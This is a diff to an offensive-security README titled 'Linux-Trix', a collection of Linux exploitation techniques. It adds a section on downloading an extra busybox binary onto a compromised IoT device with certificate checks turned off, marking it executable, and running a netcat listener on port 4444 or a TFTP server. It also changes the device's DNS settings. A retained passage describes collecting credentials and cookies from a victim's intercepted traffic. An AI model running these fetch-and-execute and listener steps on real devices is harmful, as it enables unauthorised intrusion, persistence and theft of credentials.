@@ -1,5 +1,5 @@
 # Linux-Trix
-An assortment of techniques that can be used to exploit Linux.  Most of these assume that you have or can attain root privileges on the host.  You will need to change IP addresses and other references in the examples to fit your environment.
+An assortment of techniques that can be used to exploit Linux.  These methods apply to edge cases; they are not the common exploits that you see written up in dozens of places on the web.  Most of these assume that you have or can attain root privileges on the host.  You will need to change IP addresses and other references in the examples to fit your environment.
 
 ## >> Stuffing commands into an existing ssh session
 
@@ -202,3 +202,30 @@ Change the service or edit the hosts file to relay traffic to the IP address of 
 **Claim your prize**<br />
 Once you have a capture file (e.g. victim.ldap.cap) you can open it in WireShark or NetworkMiner to retrieve credentials, files, cookies, etc that are useful.  Revert the destination IP or hosts file back to normal on victim (B).
 
+## >> Stacking busybox for increased functionality
+
+Busybox is a multi-call binary that acts as a substitute for discrete programs normally available in a Linux shell.  Instead of installing separate programs (e.g. cat, echo, ls, pwd, ...) busybox allows applets to be invoked as arguments.  However, you may find that sometimes the running instance of busybox is limited in its set of available commands.  If the device you are accessing has space in the `/tmp` folder and busybox supports the `curl` or `wget` commands and has `chmod` capabilities you should be able to download a copy of busybox for the specific processor architecture and acquire functionality that was not previously available.
+
+For example, you have access to an IOT device based on the MIPS processor architecture.  You find that it has netcat but does not support listening sockets.  Download a copy of busybox that supports `nc -l`.
+
+`curl -k https://busybox.net/downloads/binaries/1.19.0/busybox-mips > /tmp/busybox`
+
+Mark the file as executable.<br />
+`chmod +x /tmp/busybox`
+
+Execute your netcat listener.<br />
+`/tmp/busybox nc -l -p 4444`
+
+As another example, you have access to a device based on the ARMv7 processor architecture.  You find that it supports the `tftp` client but you need `tftpd` which is not present.
+
+Assume that DNS name resolution is not configured on the device.  Perform the following.<br />
+`echo "nameserver 8.8.8.8" >> /etc/resolv.conf`
+
+Download a copy of busybox that supports `tftpd`.<br />
+`wget --no-check-certificate -O - https://busybox.net/downloads/binaries/1.21.1/busybox-armv7l > /tmp/busybox`
+
+Mark the file as executable.<br />
+`chmod +x /tmp/busybox`
+
+Launch the tftp server.<br />
+`/tmp/busybox udpsvd -vE 0.0.0.0 69 /tmp/busybox tftpd -c -u ubnt /tmp`
